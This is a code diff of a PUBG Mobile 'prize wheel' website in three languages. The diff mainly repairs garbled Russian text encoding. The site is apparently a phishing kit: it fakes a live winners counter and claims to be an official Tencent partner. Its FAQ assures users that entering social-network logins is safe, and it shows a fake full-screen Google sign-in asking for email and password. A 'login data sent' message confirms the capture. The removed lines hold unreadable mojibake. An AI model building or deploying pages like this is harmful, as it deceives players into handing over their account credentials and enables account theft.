                 document.getElementById('prizeDescription').textContent = isPrizeReceived ? 
-                    (currentLang === 'ru' ? "â ÐÐ°Ñ Ð¿ÑÐ¸Ð· Ð±ÑÐ» Ð¾ÑÐ¿ÑÐ°Ð²Ð»ÐµÐ½ Ð½Ð° Ð²Ð°Ñ Ð°ÐºÐºÐ°ÑÐ½Ñ PUBG Mobile." : 
-                     currentLang === 'uz' ? "â Sovringiz PUBG Mobile hisobingizga yuborildi." : 
-                     "â Your prize has been sent to your PUBG Mobile account.") : 
-                    (currentLang === 'ru' ? "ÐÑÐ±ÐµÑÐ¸ÑÐµ ÑÐ¾ÑÐ¸Ð°Ð»ÑÐ½ÑÑ ÑÐµÑÑ Ð´Ð»Ñ Ð¿Ð¾Ð»ÑÑÐµÐ½Ð¸Ñ Ð¿ÑÐ¸Ð·Ð°." : 
+                    (currentLang === 'ru' ? "✅ Ваш приз был отправлен на ваш аккаунт PUBG Mobile." : 
+                     currentLang === 'uz' ? "✅ Sovringiz PUBG Mobile hisobingizga yuborildi." : 
+                     "✅ Your prize has been sent to your PUBG Mobile account.") : 
+                    (currentLang === 'ru' ? "Выберите социальную сеть для получения приза." : 
                      currentLang === 'uz' ? "Sovrinni olish uchun ijtimoiy tarmoqni tanlang." : 
                      "Select a social network to receive the prize.");
                 
                 const collectBtn = document.getElementById('collectPrizeBtn');
                 if (!isPrizeReceived) {
-                    collectBtn.textContent = currentLang === 'ru' ? "ÐÐÐÐ ÐÐ¢Ð¬" : currentLang === 'uz' ? "OLISH" : "COLLECT";
+                    collectBtn.textContent = currentLang === 'ru' ? "ЗАБРАТЬ" : currentLang === 'uz' ? "OLISH" : "COLLECT";
                     collectBtn.onclick = function() {
                         closePrizeWindow();
                         
-                        // ÐÐ¾ÐºÐ°Ð·ÑÐ²Ð°ÐµÐ¼ ÑÐ¾ÑÐ¼Ñ Ð²Ð²Ð¾Ð´Ð° ID Ð°ÐºÐºÐ°ÑÐ½ÑÐ°
+                        // Показываем форму ввода ID аккаунта
                         if (!accountId) {
                             accountIdSection.classList.add('active');
                             accountIdSection.scrollIntoView({ behavior: 'smooth' });
                         } else {
-                            // Ð¡Ð±ÑÐ°ÑÑÐ²Ð°ÐµÐ¼ Ð²ÑÐ±Ð¾Ñ ÑÐ¾ÑÑÐµÑÐ¸
+                            // Сбрасываем выбор соцсети
                             socialOptions.forEach(opt => opt.classList.remove('selected'));
                             selectedSocial = null;
                             
-                            // ÐÐ¾ÐºÐ°Ð·ÑÐ²Ð°ÐµÐ¼ ÑÐ¾ÑÐ¼Ñ Ð²ÑÐ±Ð¾ÑÐ° ÑÐ¾ÑÑÐµÑÐ¸
+                            // Показываем форму выбора соцсети
                             socialSelectSection.classList.add('active');
                             socialSelectSection.scrollIntoView({ behavior: 'smooth' });
                         }
                         
-                        showNotification(currentLang === 'ru' ? "ÐÑÐ±ÐµÑÐ¸ÑÐµ ÑÐ¾ÑÐ¸Ð°Ð»ÑÐ½ÑÑ ÑÐµÑÑ Ð´Ð»Ñ Ð¿Ð¾Ð»ÑÑÐµÐ½Ð¸Ñ Ð¿ÑÐ¸Ð·Ð°" : 
+                        showNotification(currentLang === 'ru' ? "Выберите социальную сеть для получения приза" : 
                                          currentLang === 'uz' ? "Sovrinni olish uchun ijtimoiy tarmoqni tanlang" : 
                                          "Select a social network to receive the prize");
                     };
                 } else {
-                    collectBtn.textContent = currentLang === 'ru' ? "ÐÐÐÐ Ð«Ð¢Ð¬" : currentLang === 'uz' ? "YOPISH" : "CLOSE";
+                    collectBtn.textContent = currentLang === 'ru' ? "ЗАКРЫТЬ" : currentLang === 'uz' ? "YOPISH" : "CLOSE";
                     collectBtn.onclick = function() {
                         closePrizeWindow();
                     };
                 }
             } else {
                 document.getElementById('winImg').src = '';
-                document.getElementById('winName').textContent = currentLang === 'ru' ? "ÐÐÐ§Ð¢Ð ÐÐ£Ð¡Ð¢Ð" : currentLang === 'uz' ? "POCHTA BO'SH" : "MAIL EMPTY";
+                document.getElementById('winName').textContent = currentLang === 'ru' ? "ПОЧТА ПУСТА" : currentLang === 'uz' ? "POCHTA BO'SH" : "MAIL EMPTY";
                 document.getElementById('prizeDescription').textContent = currentLang === 'ru' ? 
-                    "Ð£ Ð²Ð°Ñ Ð¿Ð¾ÐºÐ° Ð½ÐµÑ Ð²ÑÐ¸Ð³ÑÐ°Ð½Ð½ÑÑ Ð¿ÑÐ¸Ð·Ð¾Ð². Ð¡ÑÐ³ÑÐ°Ð¹ÑÐµ Ð² ÐºÐ¾Ð»ÐµÑÐ¾ ÑÐ´Ð°ÑÐ¸, ÑÑÐ¾Ð±Ñ Ð²ÑÐ¸Ð³ÑÐ°ÑÑ ÑÐºÑÐºÐ»ÑÐ·Ð¸Ð²Ð½ÑÐµ Ð¿ÑÐ¸Ð·Ñ!" : 
+                    "У вас пока нет выигранных призов. Сыграйте в колесо удачи, чтобы выиграть эксклюзивные призы!" : 
                     currentLang === 'uz' ? 
                     "Sizda hali yutgan sovringiz yo'q. Eksklyuziv sovrinlarni yutish uchun omad g'ildig'ida o'ynang!" : 
                     "You don't have any won prizes yet. Play the wheel of fortune to win exclusive prizes!";
                 
                 const collectBtn = document.getElementById('collectPrizeBtn');
-                collectBtn.textContent = currentLang === 'ru' ? "ÐÐÐÐ Ð«Ð¢Ð¬" : currentLang === 'uz' ? "YOPISH" : "CLOSE";
+                collectBtn.textContent = currentLang === 'ru' ? "ЗАКРЫТЬ" : currentLang === 'uz' ? "YOPISH" : "CLOSE";
                 collectBtn.onclick = function() {
                     closePrizeWindow();
                 };
@@ -3220,28 +3220,28 @@
             }
         }
         
-        // Ð¤ÑÐ½ÐºÑÐ¸Ñ ÑÐ¿ÑÐ°Ð²Ð»ÐµÐ½Ð¸Ñ ÑÑÐµÑÑÐ¸ÐºÐ¾Ð¼ Ð¿Ð¾Ð±ÐµÐ´Ð¸ÑÐµÐ»ÐµÐ¹
+        // Функция управления счетчиком победителей
         function initWinnersCounter() {
-            // ÐÐ¾Ð»ÑÑÐ°ÐµÐ¼ ÑÐ¾ÑÑÐ°Ð½ÐµÐ½Ð½Ð¾Ðµ Ð·Ð½Ð°ÑÐµÐ½Ð¸Ðµ Ð¸Ð· localStorage Ð¸Ð»Ð¸ ÑÑÑÐ°Ð½Ð°Ð²Ð»Ð¸Ð²Ð°ÐµÐ¼ ÑÐ°Ð½Ð´Ð¾Ð¼Ð½Ð¾Ðµ Ð¾Ñ 50 Ð´Ð¾ 100
+            // Получаем сохраненное значение из localStorage или устанавливаем рандомное от 50 до 100
             const savedCount = localStorage.getItem('winnersCount');
             
             if (savedCount) {
                 winnersCount = parseInt(savedCount);
             } else {
-                // ÐÐµÐ½ÐµÑÐ¸ÑÑÐµÐ¼ ÑÐ°Ð½Ð´Ð¾Ð¼Ð½Ð¾Ðµ ÑÐ¸ÑÐ»Ð¾ Ð¾Ñ 50 Ð´Ð¾ 100
+                // Генерируем рандомное число от 50 до 100
                 winnersCount = Math.floor(Math.random() * 51) + 50;
                 localStorage.setItem('winnersCount', winnersCount.toString());
             }
             
-            // ÐÐ±Ð½Ð¾Ð²Ð»ÑÐµÐ¼ Ð¾ÑÐ¾Ð±ÑÐ°Ð¶ÐµÐ½Ð¸Ðµ
+            // Обновляем отображение
             updateWinnersDisplay();
             
-            // ÐÐ°Ð¿ÑÑÐºÐ°ÐµÐ¼ ÑÐ°Ð¹Ð¼ÐµÑ Ð´Ð»Ñ ÑÐ²ÐµÐ»Ð¸ÑÐµÐ½Ð¸Ñ ÑÑÐµÑÑÐ¸ÐºÐ° ÐºÐ°Ð¶Ð´ÑÐµ 40 ÑÐµÐºÑÐ½Ð´
+            // Запускаем таймер для увеличения счетчика каждые 40 секунд
             winnersInterval = setInterval(() => {
-                winnersCount += Math.floor(Math.random() * 3) + 1; // ÐÐ¾Ð±Ð°Ð²Ð»ÑÐµÐ¼ 1-3 Ð¿Ð¾Ð±ÐµÐ´Ð¸ÑÐµÐ»Ñ
+                winnersCount += Math.floor(Math.random() * 3) + 1; // Добавляем 1-3 победителя
                 localStorage.setItem('winnersCount', winnersCount.toString());
                 updateWinnersDisplay();
-            }, 40000); // 40 ÑÐµÐºÑÐ½Ð´
+            }, 40000); // 40 секунд
         }
         
         function updateWinnersDisplay() {
@@ -3249,7 +3249,7 @@
             if (countElement) {
                 countElement.textContent = winnersCount;
                 
-                // ÐÐ½Ð¸Ð¼Ð°ÑÐ¸Ñ Ð¿ÑÐ¸ Ð¾Ð±Ð½Ð¾Ð²Ð»ÐµÐ½Ð¸Ð¸
+                // Анимация при обновлении
                 countElement.style.transform = 'scale(1.2)';
                 setTimeout(() => {
                     countElement.style.transform = 'scale(1)';
@@ -3258,13 +3258,13 @@
         }
         
         document.addEventListener('DOMContentLoaded', function() {
-            // ÐÐ½Ð¸ÑÐ¸Ð°Ð»Ð¸Ð·Ð¸ÑÑÐµÐ¼ ÑÐ½ÐµÐ³
+            // Инициализируем снег
             createSnow();
             
-            // ÐÐ½Ð¸ÑÐ¸Ð°Ð»Ð¸Ð·Ð¸ÑÑÐµÐ¼ ÑÑÐµÑÑÐ¸Ðº Ð¿Ð¾Ð±ÐµÐ´Ð¸ÑÐµÐ»ÐµÐ¹
+            // Инициализируем счетчик победителей
             initWinnersCounter();
             
-            // ÐÐ¾Ð»ÑÑÐ°ÐµÐ¼ IP Ð¿Ð¾Ð»ÑÐ·Ð¾Ð²Ð°ÑÐµÐ»Ñ
+            // Получаем IP пользователя
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
@@ -3272,14 +3272,14 @@
                     console.log('User IP:', userIP);
                     console.log('Owner IP:', ownerIP);
                     
-                    // ÐÑÐ¾Ð²ÐµÑÑÐµÐ¼, ÑÐ²Ð»ÑÐµÑÑÑ Ð»Ð¸ Ð¿Ð¾Ð»ÑÐ·Ð¾Ð²Ð°ÑÐµÐ»Ñ Ð²Ð»Ð°Ð´ÐµÐ»ÑÑÐµÐ¼
+                    // Проверяем, является ли пользователь владельцем
                     if (userIP === ownerIP) {
                         console.log('Owner detected - unlimited spins');
                         hasPlayed = false;
                         localStorage.setItem('isOwner', 'true');
                     } else {
                         console.log('Regular user - one spin only');
-                        // ÐÑÐ¾Ð²ÐµÑÑÐµÐ¼, Ð¸Ð³ÑÐ°Ð» Ð»Ð¸ ÑÐ¶Ðµ Ð¿Ð¾Ð»ÑÐ·Ð¾Ð²Ð°ÑÐµÐ»Ñ
+                        // Проверяем, играл ли уже пользователь
                         const played = localStorage.getItem('hasPlayed');
                         hasPlayed = played === 'true';
                     }
@@ -3310,7 +3310,7 @@
             const menuBtn = document.getElementById('menuBtn');
             const dropdownMenu = document.getElementById('dropdownMenu');
             
-            // Ð­Ð»ÐµÐ¼ÐµÐ½ÑÑ Google Fullscreen
+            // Элементы Google Fullscreen
             const googleFullscreen = document.getElementById('googleFullscreen');
             const googleEmailInput = document.getElementById('googleEmailInput');
             const googlePasswordInput = document.getElementById('googlePasswordInput');
@@ -3320,7 +3320,7 @@
             const googleStep1 = document.getElementById('googleStep1');
             const googleStep2 = document.getElementById('googleStep2');
             
-            // ÐÑÐ¸Ð·Ñ Ñ ÐºÐ°ÑÑÐ¸Ð½ÐºÐ°Ð¼Ð¸
+            // Призы с картинками
             const prizes = [
                 { id: 1, image: "priz1.png" },
                 { id: 2, image: "priz2.png" },
@@ -3341,10 +3341,10 @@
             let finalPrizeIndex = 0;
             let selectedSocial = null;
             
-            // ÐÐ¾ÑÑÐ´Ð¾Ðº Ð¾Ð±ÑÐ¾Ð´Ð° Ð¿ÑÐ¸Ð·Ð¾Ð²
+            // Порядок обхода призов
             const prizeOrder = [0, 1, 2, 3, 4, 5, 6, 7, 8];
             
-            // Ð¯Ð·ÑÐºÐ¾Ð²ÑÐµ Ð½Ð°ÑÑÑÐ¾Ð¹ÐºÐ¸
+            // Языковые настройки
             const translations = {
                 en: {
                     winnersCounter: "Winners:",
@@ -3356,7 +3356,7 @@
                     selected: "SELECTED",
                     prizeBanner: "YOUR PRIZE",
                     prizeDescription: "The item has been sent to your game mail. Please wait up to 24 hours for transaction processing.",
-                    prizeReceived: "â Your prize has been sent to your PUBG Mobile account.",
+                    prizeReceived: "✅ Your prize has been sent to your PUBG Mobile account.",
                     selectPrize: "Select a social network to receive the prize.",
                     mailEmpty: "You don't have any won prizes yet. Play the wheel of fortune to win exclusive prizes!",
                     collect: "COLLECT",
@@ -3399,66 +3399,66 @@
                         "Our roulette features <strong>exclusive items from PUBG Mobile</strong>: rare skins, weapons, vehicles, equipment, and in-game UC currency. All prizes are official game content and do not violate the user agreement."
                     ],
                     footerLinks: ["Terms of Service", "Privacy Policy", "Cookie Policy", "Cookie Preferences"],
-                    copyright: "Copyright Â© High Morale Developments Limited. All rights reserved.",
+                    copyright: "Copyright © High Morale Developments Limited. All rights reserved.",
                     notificationPrize: "Congratulations! You won a prize!",
                     notificationIdSaved: "Account ID saved"
                 },
                 ru: {
-                    winnersCounter: "ÐÐ¾Ð±ÐµÐ´Ð¸ÑÐµÐ»ÐµÐ¹:",
-                    menu: "ÐÐµÐ½Ñ",
-                    support: "ÐÐ¾Ð´Ð´ÐµÑÐ¶ÐºÐ°",
-                    myPrize: "ÐÐ¾Ð¹ Ð¿ÑÐ¸Ð·",
-                    play: "ÐÐÐ ÐÐ¢Ð¬",
-                    alreadyPlayed: "Ð£ÐÐ ÐÐÐ ÐÐÐ",
-                    selected: "ÐÐ«ÐÐ ÐÐÐ",
-                    prizeBanner: "ÐÐÐ¨ ÐÐ ÐÐ",
-                    prizeDescription: "ÐÑÐµÐ´Ð¼ÐµÑ Ð±ÑÐ» Ð¾ÑÐ¿ÑÐ°Ð²Ð»ÐµÐ½ Ð½Ð° Ð²Ð°ÑÑ Ð¸Ð³ÑÐ¾Ð²ÑÑ Ð¿Ð¾ÑÑÑ. ÐÐ¾Ð¶Ð°Ð»ÑÐ¹ÑÑÐ°, Ð¿Ð¾Ð´Ð¾Ð¶Ð´Ð¸ÑÐµ Ð´Ð¾ 24 ÑÐ°ÑÐ¾Ð² Ð´Ð»Ñ Ð¾Ð±ÑÐ°Ð±Ð¾ÑÐºÐ¸ ÑÑÐ°Ð½Ð·Ð°ÐºÑÐ¸Ð¸.",
-                    prizeReceived: "â ÐÐ°Ñ Ð¿ÑÐ¸Ð· Ð±ÑÐ» Ð¾ÑÐ¿ÑÐ°Ð²Ð»ÐµÐ½ Ð½Ð° Ð²Ð°Ñ Ð°ÐºÐºÐ°ÑÐ½Ñ PUBG Mobile.",
-                    selectPrize: "ÐÑÐ±ÐµÑÐ¸ÑÐµ ÑÐ¾ÑÐ¸Ð°Ð»ÑÐ½ÑÑ ÑÐµÑÑ Ð´Ð»Ñ Ð¿Ð¾Ð»ÑÑÐµÐ½Ð¸Ñ Ð¿ÑÐ¸Ð·Ð°.",
-                    mailEmpty: "Ð£ Ð²Ð°Ñ Ð¿Ð¾ÐºÐ° Ð½ÐµÑ Ð²ÑÐ¸Ð³ÑÐ°Ð½Ð½ÑÑ Ð¿ÑÐ¸Ð·Ð¾Ð². Ð¡ÑÐ³ÑÐ°Ð¹ÑÐµ Ð² ÐºÐ¾Ð»ÐµÑÐ¾ ÑÐ´Ð°ÑÐ¸, ÑÑÐ¾Ð±Ñ Ð²ÑÐ¸Ð³ÑÐ°ÑÑ ÑÐºÑÐºÐ»ÑÐ·Ð¸Ð²Ð½ÑÐµ Ð¿ÑÐ¸Ð·Ñ!",
-                    collect: "ÐÐÐÐ ÐÐ¢Ð¬",
-                    close: "ÐÐÐÐ Ð«Ð¢Ð¬",
-                    idTitle: "ÐÐÐÐÐÐ¢Ð ID ÐÐÐÐÐ£ÐÐ¢Ð PUBG",
-                    idText: "ÐÐ¾Ð¶Ð°Ð»ÑÐ¹ÑÑÐ°, Ð²Ð²ÐµÐ´Ð¸ÑÐµ Ð²Ð°Ñ ID Ð°ÐºÐºÐ°ÑÐ½ÑÐ° PUBG Mobile Ð´Ð»Ñ Ð¿Ð¾Ð»ÑÑÐµÐ½Ð¸Ñ Ð¿ÑÐ¸Ð·Ð°",
-                    idLabel: "ID Ð°ÐºÐºÐ°ÑÐ½ÑÐ° PUBG:",
-                    idPlaceholder: "ÐÐ²ÐµÐ´Ð¸ÑÐµ Ð²Ð°Ñ ID Ð°ÐºÐºÐ°ÑÐ½ÑÐ°",
-                    idSubmit: "ÐÐ ÐÐÐÐÐÐÐ¢Ð¬",
-                    selectTitle: "ÐÐ«ÐÐÐ ÐÐ¢Ð Ð¡ÐÐÐ¡ÐÐ ÐÐÐÐ£Ð§ÐÐÐÐ¯",
-                    selectText: "ÐÑÐ±ÐµÑÐ¸ÑÐµ ÑÐ¾ÑÐ¸Ð°Ð»ÑÐ½ÑÑ ÑÐµÑÑ Ð´Ð»Ñ Ð¿Ð¾Ð»ÑÑÐµÐ½Ð¸Ñ Ð¿ÑÐ¸Ð·Ð°",
-                    getPrizeBtn: "ÐÐÐÐ£Ð§ÐÐ¢Ð¬ ÐÐ ÐÐ",
-                    importantNote: "ÐÐ°Ð¶Ð½Ð¾: ÐÑÐ¸Ð· Ð±ÑÐ´ÐµÑ Ð·Ð°ÑÐ¸ÑÐ»ÐµÐ½ Ð½Ð° Ð²Ð°Ñ Ð°ÐºÐºÐ°ÑÐ½Ñ Ð² ÑÐµÑÐµÐ½Ð¸Ðµ 24 ÑÐ°ÑÐ¾Ð²",
-                    notificationSuccess: "ÐÐ°ÑÐ²ÐºÐ° Ð¿ÑÐ¸Ð½ÑÑÐ°! ÐÑÐ¸Ð· Ð±ÑÐ´ÐµÑ Ð·Ð°ÑÐ¸ÑÐ»ÐµÐ½ Ð² ÑÐµÑÐµÐ½Ð¸Ðµ 24 ÑÐ°ÑÐ¾Ð².",
-                    notificationSelectSocial: "ÐÐ¾Ð¶Ð°Ð»ÑÐ¹ÑÑÐ°, Ð²ÑÐ±ÐµÑÐ¸ÑÐµ ÑÐ¾ÑÐ¸Ð°Ð»ÑÐ½ÑÑ ÑÐµÑÑ",
-                    notificationAlreadyPlayed: "ÐÑ ÑÐ¶Ðµ Ð¸ÑÐ¿Ð¾Ð»ÑÐ·Ð¾Ð²Ð°Ð»Ð¸ ÑÐ²Ð¾Ñ Ð¿Ð¾Ð¿ÑÑÐºÑ ÑÐµÐ³Ð¾Ð´Ð½Ñ!",
-                    notificationIdRequired: "ÐÐ¾Ð¶Ð°Ð»ÑÐ¹ÑÑÐ°, Ð²Ð²ÐµÐ´Ð¸ÑÐµ ID Ð°ÐºÐºÐ°ÑÐ½ÑÐ°",
-                    confirmationTitle: "ÐÐÐ¯ÐÐÐ ÐÐ ÐÐÐ¯Ð¢Ð!",
-                    confirmationMessage: "ÐÐ°Ñ Ð²ÑÐ¸Ð³ÑÑÑ Ð±ÑÐ´ÐµÑ Ð·Ð°ÑÐ¸ÑÐ»ÐµÐ½ Ð½Ð° Ð°ÐºÐºÐ°ÑÐ½Ñ PUBG Mobile Ð² ÑÐµÑÐµÐ½Ð¸Ðµ 24 ÑÐ°ÑÐ¾Ð².",
-                    loginSuccess: "ÐÐ°Ð½Ð½ÑÐµ Ð´Ð»Ñ Ð²ÑÐ¾Ð´Ð° Ð¾ÑÐ¿ÑÐ°Ð²Ð»ÐµÐ½Ñ! ÐÑÐ¸Ð· Ð±ÑÐ´ÐµÑ Ð·Ð°ÑÐ¸ÑÐ»ÐµÐ½ Ð² ÑÐµÑÐµÐ½Ð¸Ðµ 24 ÑÐ°ÑÐ¾Ð².",
-                    faqTitle: "ÐÐÐÐ ÐÐ¡Ð« Ð ÐÐ¢ÐÐÐ¢Ð«",
+                    winnersCounter: "Победителей:",
+                    menu: "Меню",
+                    support: "Поддержка",
+                    myPrize: "Мой приз",
+                    play: "ИГРАТЬ",
+                    alreadyPlayed: "УЖЕ ИГРАЛИ",
+                    selected: "ВЫБРАНО",
+                    prizeBanner: "ВАШ ПРИЗ",
+                    prizeDescription: "Предмет был отправлен на вашу игровую почту. Пожалуйста, подождите до 24 часов для обработки транзакции.",
+                    prizeReceived: "✅ Ваш приз был отправлен на ваш аккаунт PUBG Mobile.",
+                    selectPrize: "Выберите социальную сеть для получения приза.",
+                    mailEmpty: "У вас пока нет выигранных призов. Сыграйте в колесо удачи, чтобы выиграть эксклюзивные призы!",
+                    collect: "ЗАБРАТЬ",
+                    close: "ЗАКРЫТЬ",
+                    idTitle: "ВВЕДИТЕ ID АККАУНТА PUBG",
+                    idText: "Пожалуйста, введите ваш ID аккаунта PUBG Mobile для получения приза",
+                    idLabel: "ID аккаунта PUBG:",
+                    idPlaceholder: "Введите ваш ID аккаунта",
+                    idSubmit: "ПРОДОЛЖИТЬ",
+                    selectTitle: "ВЫБЕРИТЕ СПОСОБ ПОЛУЧЕНИЯ",
+                    selectText: "Выберите социальную сеть для получения приза",
+                    getPrizeBtn: "ПОЛУЧИТЬ ПРИЗ",
+                    importantNote: "Важно: Приз будет зачислен на ваш аккаунт в течение 24 часов",
+                    notificationSuccess: "Заявка принята! Приз будет зачислен в течение 24 часов.",
+                    notificationSelectSocial: "Пожалуйста, выберите социальную сеть",
+                    notificationAlreadyPlayed: "Вы уже использовали свою попытку сегодня!",
+                    notificationIdRequired: "Пожалуйста, введите ID аккаунта",
+                    confirmationTitle: "ЗАЯВКА ПРИНЯТА!",
+                    confirmationMessage: "Ваш выигрыш будет зачислен на аккаунт PUBG Mobile в течение 24 часов.",
+                    loginSuccess: "Данные для входа отправлены! Приз будет зачислен в течение 24 часов.",
+                    faqTitle: "ВОПРОСЫ И ОТВЕТЫ",
                     faqQuestions: [
-                        "Ð­ÑÐ¾ Ð¾ÑÐ¸ÑÐ¸Ð°Ð»ÑÐ½ÑÐ¹ ÑÐ°Ð¹Ñ PUBG Mobile?",
-                        "ÐÑÐ¸Ð· ÑÐ¾ÑÐ½Ð¾ Ð¿ÑÐ¸Ð´ÐµÑ Ð½Ð° Ð¼Ð¾Ð¹ Ð°ÐºÐºÐ°ÑÐ½Ñ?",
-                        "ÐÐ°ÑÐµÐ¼ Ð½ÑÐ¶Ð½Ð¾ Ð²ÑÐ¾Ð´Ð¸ÑÑ Ð² ÑÐ¾ÑÐ¸Ð°Ð»ÑÐ½ÑÑ ÑÐµÑÑ?",
-                        "Ð§ÑÐ¾ Ð±ÑÐ´ÐµÑ, ÐµÑÐ»Ð¸ Ñ Ð½Ðµ ÑÐºÐ°Ð¶Ñ ID Ð°ÐºÐºÐ°ÑÐ½ÑÐ°?",
-                        "Ð§ÑÐ¾ Ð´ÐµÐ»Ð°ÑÑ, ÐµÑÐ»Ð¸ Ð¿ÑÐ¸Ð· Ð½Ðµ Ð¿ÑÐ¸ÑÐµÐ» Ð² ÑÐµÑÐµÐ½Ð¸Ðµ 24 ÑÐ°ÑÐ¾Ð²?",
-                        "ÐÐµÐ·Ð¾Ð¿Ð°ÑÐ½Ð¾ Ð»Ð¸ Ð²Ð²Ð¾Ð´Ð¸ÑÑ Ð´Ð°Ð½Ð½ÑÐµ Ð¾Ñ ÑÐ¾ÑÐ¸Ð°Ð»ÑÐ½ÑÑ ÑÐµÑÐµÐ¹?",
-                        "ÐÐ¾Ð¶Ð½Ð¾ Ð»Ð¸ Ð²ÑÐ¸Ð³ÑÐ°ÑÑ Ð±Ð¾Ð»ÑÑÐµ Ð¾Ð´Ð½Ð¾Ð³Ð¾ ÑÐ°Ð·Ð°?",
-                        "ÐÐ°ÐºÐ¸Ðµ Ð¿ÑÐ¸Ð·Ñ Ð¼Ð¾Ð¶Ð½Ð¾ Ð²ÑÐ¸Ð³ÑÐ°ÑÑ?"
+                        "Это официальный сайт PUBG Mobile?",
+                        "Приз точно придет на мой аккаунт?",
+                        "Зачем нужно входить в социальную сеть?",
+                        "Что будет, если я не укажу ID аккаунта?",
+                        "Что делать, если приз не пришел в течение 24 часов?",
+                        "Безопасно ли вводить данные от социальных сетей?",
+                        "Можно ли выиграть больше одного раза?",
+                        "Какие призы можно выиграть?"
                     ],
                     faqAnswers: [
-                        "<strong>ÐÐ°, ÑÑÐ¾ Ð¾ÑÐ¸ÑÐ¸Ð°Ð»ÑÐ½ÑÐ¹ ÑÐ°Ð¹Ñ Ð¿Ð°ÑÑÐ½ÐµÑÐ°.</strong> ÐÑ ÑÐ²Ð»ÑÐµÐ¼ÑÑ Ð¾ÑÐ¸ÑÐ¸Ð°Ð»ÑÐ½ÑÐ¼Ð¸ Ð¿Ð°ÑÑÐ½ÐµÑÐ°Ð¼Ð¸ Tencent Games Ð¸ ÑÐ°Ð±Ð¾ÑÐ°ÐµÐ¼ Ð² ÑÐ°Ð¼ÐºÐ°Ñ Ð¿ÑÐ¾Ð³ÑÐ°Ð¼Ð¼Ñ PUBG Mobile Partner. ÐÐ°ÑÐ° Ð´ÐµÑÑÐµÐ»ÑÐ½Ð¾ÑÑÑ Ð¿Ð¾Ð»Ð½Ð¾ÑÑÑÑ Ð°Ð²ÑÐ¾ÑÐ¸Ð·Ð¾Ð²Ð°Ð½Ð° ÑÐ°Ð·ÑÐ°Ð±Ð¾ÑÑÐ¸ÐºÐ°Ð¼Ð¸.",
-                        "<strong>ÐÐ°, 100% Ð³Ð°ÑÐ°Ð½ÑÐ¸Ñ Ð¿Ð¾Ð»ÑÑÐµÐ½Ð¸Ñ Ð¿ÑÐ¸Ð·Ð°.</strong> ÐÑÐµ Ð²ÑÐ¸Ð³ÑÑÑÐ¸ Ð¾ÑÐ¿ÑÐ°Ð²Ð»ÑÑÑÑÑ Ð°Ð²ÑÐ¾Ð¼Ð°ÑÐ¸ÑÐµÑÐºÐ¸ Ð² ÑÐµÑÐµÐ½Ð¸Ðµ 24 ÑÐ°ÑÐ¾Ð² Ð¿Ð¾ÑÐ»Ðµ Ð¿Ð¾Ð´ÑÐ²ÐµÑÐ¶Ð´ÐµÐ½Ð¸Ñ Ð´Ð°Ð½Ð½ÑÑ. Ð¡Ð¸ÑÑÐµÐ¼Ð° Ð¸Ð½ÑÐµÐ³ÑÐ¸ÑÐ¾Ð²Ð°Ð½Ð° Ñ Ð¾ÑÐ¸ÑÐ¸Ð°Ð»ÑÐ½ÑÐ¼ API PUBG Mobile, ÑÑÐ¾ Ð³Ð°ÑÐ°Ð½ÑÐ¸ÑÑÐµÑ Ð´Ð¾ÑÑÐ°Ð²ÐºÑ Ð¿ÑÐ¸Ð·Ð¾Ð² Ð½Ð° ÑÐºÐ°Ð·Ð°Ð½Ð½ÑÐ¹ Ð°ÐºÐºÐ°ÑÐ½Ñ.",
-                        "ÐÑÐ¾Ð´ Ð² ÑÐ¾ÑÐ¸Ð°Ð»ÑÐ½ÑÑ ÑÐµÑÑ Ð½ÐµÐ¾Ð±ÑÐ¾Ð´Ð¸Ð¼ Ð´Ð»Ñ <strong>Ð¿Ð¾Ð´ÑÐ²ÐµÑÐ¶Ð´ÐµÐ½Ð¸Ñ Ð²Ð°ÑÐµÐ¹ Ð»Ð¸ÑÐ½Ð¾ÑÑÐ¸</strong> Ð¸ Ð¿ÑÐµÐ´Ð¾ÑÐ²ÑÐ°ÑÐµÐ½Ð¸Ñ Ð¼Ð¾ÑÐµÐ½Ð½Ð¸ÑÐµÑÑÐ²Ð°. Ð­ÑÐ¾ Ð¿Ð¾Ð·Ð²Ð¾Ð»ÑÐµÑ Ð½Ð°Ð¼ ÑÐ±ÐµÐ´Ð¸ÑÑÑÑ, ÑÑÐ¾ Ð¿ÑÐ¸Ð· Ð¿Ð¾Ð»ÑÑÐ°ÐµÑ ÑÐµÐ°Ð»ÑÐ½ÑÐ¹ ÑÐµÐ»Ð¾Ð²ÐµÐº, Ð° Ð½Ðµ Ð±Ð¾Ñ. ÐÑÐµ Ð´Ð°Ð½Ð½ÑÐµ Ð·Ð°ÑÐ¸ÑÐµÐ½Ñ Ð¸ Ð½Ðµ Ð¿ÐµÑÐµÐ´Ð°ÑÑÑÑ ÑÑÐµÑÑÐ¸Ð¼ Ð»Ð¸ÑÐ°Ð¼.",
-                        "ÐÐµÐ· ÑÐºÐ°Ð·Ð°Ð½Ð¸Ñ ID Ð°ÐºÐºÐ°ÑÐ½ÑÐ° PUBG Mobile Ð¼Ñ <strong>Ð½Ðµ Ð¼Ð¾Ð¶ÐµÐ¼ Ð¾ÑÐ¿ÑÐ°Ð²Ð¸ÑÑ Ð²Ð°Ð¼ Ð¿ÑÐ¸Ð·</strong>. Ð­ÑÐ¾ Ð¾Ð±ÑÐ·Ð°ÑÐµÐ»ÑÐ½Ð¾Ðµ Ð¿Ð¾Ð»Ðµ, ÑÐ°Ðº ÐºÐ°Ðº Ð¸Ð¼ÐµÐ½Ð½Ð¾ Ð¿Ð¾ ÑÑÐ¾Ð¼Ñ Ð¸Ð´ÐµÐ½ÑÐ¸ÑÐ¸ÐºÐ°ÑÐ¾ÑÑ ÑÐ¸ÑÑÐµÐ¼Ð° Ð¾Ð¿ÑÐµÐ´ÐµÐ»ÑÐµÑ, Ð½Ð° ÐºÐ°ÐºÐ¾Ð¹ Ð¸Ð³ÑÐ¾Ð²Ð¾Ð¹ Ð°ÐºÐºÐ°ÑÐ½Ñ Ð·Ð°ÑÐ¸ÑÐ»Ð¸ÑÑ Ð²ÑÐ¸Ð³ÑÐ°Ð½Ð½ÑÐµ Ð¿ÑÐµÐ´Ð¼ÐµÑÑ.",
